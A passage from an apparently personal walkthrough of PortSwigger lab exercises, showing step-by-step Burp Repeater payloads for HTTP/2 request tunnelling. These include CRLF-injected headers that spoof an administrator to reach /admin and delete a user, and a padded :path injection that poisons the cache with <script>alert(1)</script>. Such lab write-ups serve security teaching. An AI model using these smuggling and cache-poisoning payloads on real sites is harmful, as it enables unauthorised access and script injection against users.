X-FRONTEND-KEY: 3643839450274048

Go to Inspector -> Drop down 'Request Attributes'
Method: HEAD
Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Change:

foo: bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: 3643839450274048\r\n
\r\n

Value: xyz

"Apply changes"
Go to Inspector -> Drop down 'Request Headers'
Change:

:path /login

Response:

HTTP/2 200 OK

<a href="/admin/delete?username=carlos">

Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Change:

foo: bar\r\n
\r\n
GET /admin/delete?username=carlos HTTP/1.1\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: 3643839450274048\r\n
\r\n

Value: xyz

Response:

HTTP/2 500 Internal Server Error

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610001924.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610002055.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610002200.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610002307.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610002428.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610002516.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610002919.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610003112.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610003322.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610004003.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610004100.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610004224.png)

### Web cache poisoning via HTTP/2 request tunnelling
```bash

# This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers.

# To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes alert(1). A victim user will visit the home page every 15 seconds.

# The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling. 

# This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).

Refresh the page
Go to: HTTP history
Find:

POST / HTTP/1.1

Send to repeater
Go to Repeater -> Check Allow HTTP/2 ALPN override
Go to Inspector -> Drop down 'Request Attributes' 
Protocol - HTTP/2
Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Change:
Name:
:path

Value

/?cb=1 HTTP/1.1\r\n
Foo: bar

Response:

HTTP/2 200 OK

Go to Inspector -> Drop down 'Request Attributes'
Method: HEAD
Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Change:
Name:
:path

Value

/?cb=1 HTTP/1.1\r\n
Host: acf51f801e679268c09c3539004500ad.web-security-academy.net\r\n
\r\n
GET /post?postId=1 HTTP/1.1\r\n
Foo: bar

Response:

HTTP/2 200 OK

<section class="add-comment">

Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Change:
Name:
:path

Value

/?cb=1 HTTP/1.1\r\n
Host: acf51f801e679268c09c3539004500ad.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
Foo: bar

Response:

HTTP/2 500 Internal Server Error

Go to: HTTP history
Find:

GET / HTTP/1.1

Response:

Content-Length: 8672

Go to Inspector -> Drop down 'Request Headers'
(Shift+Return == \r\n)
Change: ( > the normal "Content-Length: 8672" reponse of request 'GET / HTTP/1.1') (The below example represents 8700 characters)
Change:
Name:
:path

Value

/?cb=1 HTTP/1.1\r\n
Host: acf51f801e679268c09c3539004500ad.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script>ewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfwerfweafgewagerwasghewrfweafgewagerwerfweafgewagerwasghewrfweafgewagerw HTTP/1.1\r\n
Foo: bar

Response:

HTTP/2 200 OK

X-Cache: miss

HTTP/1.1 302 Found
Location: /resources/?<script>alert(1)</script>

Remove the '?cb?=1' to simulate the root directory of targeted website
Change:
Name:
:path

Value

/ HTTP/1.1\r\n
Host: acf51f801e679268c09c3539004500ad.web-security-academy.net\r\n
\r\n
GET /resources?<script>alert(1)</script>ewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfweafgewagerwageragreasghewrfwerfweafgewagerwasghewrfweafgewagerwerfweafgewagerwasghewrfweafgewagerw HTTP/1.1\r\n
Foo: bar

Response:

HTTP/2 200 OK

X-Cache: miss

HTTP/1.1 302 Found
Location: /resources/?<script>alert(1)</script>

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610010416.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610010537.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610010643.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610011003.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610011253.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610011404.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610011649.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610011855.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610011951.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610012022.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220610012159.png)

#hacking
